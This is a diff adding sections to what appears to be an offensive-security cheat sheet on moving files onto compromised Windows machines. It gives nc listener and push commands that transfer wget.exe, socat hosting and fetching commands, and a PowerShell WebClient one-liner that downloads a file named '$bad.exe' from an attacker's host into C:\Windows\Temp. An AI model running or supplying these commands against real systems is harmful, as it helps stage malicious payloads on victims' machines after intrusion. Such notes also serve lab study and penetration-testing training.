@@ -1,3 +1,24 @@
+## NC
+```powershell
+# Listener on Windows system
+nc -lvnp $PORT > tranfered.exe
+# Push wget.exe onto windows system
+nc -nv $IP $PORT < /usr/share/windows-resources/binaries/wget.exe
+```
+
+## Socat
+Host with
+```bash
+sudo socat TCP4-LISTEN:$PORT,fork file:$filename
+```
+Transfer with
+```powershell
+socat TCP4:$IP:$PORT file:$filename,create
+```
+## Powershell
+```powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$bad.exe','C:\Windows\Temp\$bad.exe')"
+```
 
 
 ## CertUtil
